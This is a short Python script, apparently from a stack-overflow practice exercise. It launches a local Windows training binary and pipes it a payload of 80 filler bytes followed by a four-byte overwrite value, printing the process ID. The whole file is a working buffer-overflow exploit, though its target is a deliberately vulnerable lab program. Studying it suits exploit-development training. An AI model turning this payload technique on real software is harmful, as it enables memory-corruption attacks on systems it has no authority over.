import sys
from subprocess  import Popen, PIPE

payload = b"A" * 80 + b"\x44\x43\x42\x41"
io =Popen(r"C:\code\exploit\part1-stackabos\STACKS\STACK1_VS_2017.exe", stdin=PIPE)

print("PID: %s" %hex(io.pid))
print("Enter the payload")
io.communicate(payload)
io.wait()
input()